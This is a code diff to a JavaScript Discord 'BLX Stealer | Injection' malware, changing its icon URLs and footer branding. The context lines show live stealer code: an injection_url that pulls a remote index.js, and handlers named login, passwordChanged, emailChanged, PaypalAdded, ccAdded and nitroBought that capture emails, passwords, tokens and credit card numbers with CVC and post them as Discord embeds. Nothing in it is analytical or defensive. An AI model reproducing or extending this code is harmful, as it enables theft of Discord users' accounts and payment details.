@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'BLX Stealer | Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg'.replace(/ /g, '%20'), 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1059829665268768898/1096511155041742858/Picsart_23-04-14_22-03-12-039.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/yagiz011/main/main/index.js', 
   /**
@@ -681,7 +681,7 @@ const login = async (email, password, token) => {
         },
         footer: {
             text: 'BLX Injection | blx.#2221 ',
-            icon_url: "https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg"
+            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1096511155041742858/Picsart_23-04-14_22-03-12-039.jpg"
         },
       },
     ],
@@ -723,8 +723,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'BLX Injection | BasEdemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg"
+            text: 'BLX Injection | blx.#2221',
+            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1096511155041742858/Picsart_23-04-14_22-03-12-039.jpg"
         },
       },
     ],
@@ -767,7 +767,7 @@ const emailChanged = async (email, password, token) => {
         },
         footer: {
             text: 'BLX Injection | blx.#2221',
-            icon_url: "https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg"
+            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1096511155041742858/Picsart_23-04-14_22-03-12-039.jpg"
         },
       },
     ],
@@ -810,7 +810,7 @@ const PaypalAdded = async (token) => {
         },
         footer: {
             text: 'BLX Injection | blx.#2221',
-            icon_url: "https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg"
+            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1096511155041742858/Picsart_23-04-14_22-03-12-039.jpg"
         },
       },
     ],
@@ -853,7 +853,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         },
         footer: {
             text: 'BLX Injection | blx.#2221',
-            icon_url: "https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg"
+            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1096511155041742858/Picsart_23-04-14_22-03-12-039.jpg"
         },
       },
     ],
@@ -898,7 +898,7 @@ const nitroBought = async (token) => {
         },
         footer: {
             text: 'BLX Injection | blx.#2221',
-            icon_url: "https://cdn.discordapp.com/attachments/1082712019804885132/1082715126127407104/Picsart_22-10-09_19-38-04-767.jpg"
+            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1096511155041742858/Picsart_23-04-14_22-03-12-039.jpg"
         },
       },
     ],
